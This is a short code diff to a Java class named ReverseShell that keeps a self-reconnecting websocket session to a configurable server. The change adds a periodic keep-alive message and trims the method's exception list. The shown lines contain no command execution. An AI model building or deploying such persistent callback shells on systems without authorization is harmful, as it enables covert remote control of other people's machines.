@@ -61,7 +61,7 @@ public class ReverseShell implements WebsocketReverseShellService {
     }
 
 
-    private void connectWithReconnectionSupport() throws ExecutionException, InterruptedException, IOException, URISyntaxException {
+    private void connectWithReconnectionSupport() throws  InterruptedException,  URISyntaxException {
         URI serverUri = new URI(this.serverUriLink); // Replace with your server URL
 
         while (true){
@@ -72,6 +72,8 @@ public class ReverseShell implements WebsocketReverseShellService {
 
                 while (session.get().isOpen()){
 //               don't create new sessions while the session is open
+                    Thread.sleep(50000);
+                    session.get().getRemote().sendString("KEEP_ALIVE");
                 }
             }catch (Exception e){
                e.printStackTrace();
